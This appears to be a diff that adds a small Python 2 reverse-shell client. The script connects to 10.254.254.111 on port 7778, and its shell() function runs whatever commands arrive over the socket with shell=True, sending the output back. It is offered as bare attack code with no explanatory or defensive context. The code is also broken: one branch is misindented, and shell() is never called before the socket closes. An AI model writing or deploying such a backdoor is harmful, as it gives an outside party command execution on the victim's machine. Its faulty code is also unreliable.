@@ -1,0 +1,30 @@
+#!/usr/bin/env python
+#_*_ coding: utf8 _*_
+
+import socket
+import os
+import subprocess
+
+def shell():
+    current_dir = os.getcwd()
+    client.send(current_dir)
+    while True:
+        res = client.recv(1024)
+        if res == "exit":
+           break
+       elif res[:2] == "cd" and len(res) > 2:
+           os.chdir(res[3:])
+           result = os.getcwd()
+           client.send(result)
+           pass
+        else:
+            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read()
+            if len(result) == 0:
+                client.send("1")
+            else:
+                client.send(result)
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(("10.254.254.111",7778))
+client.close()
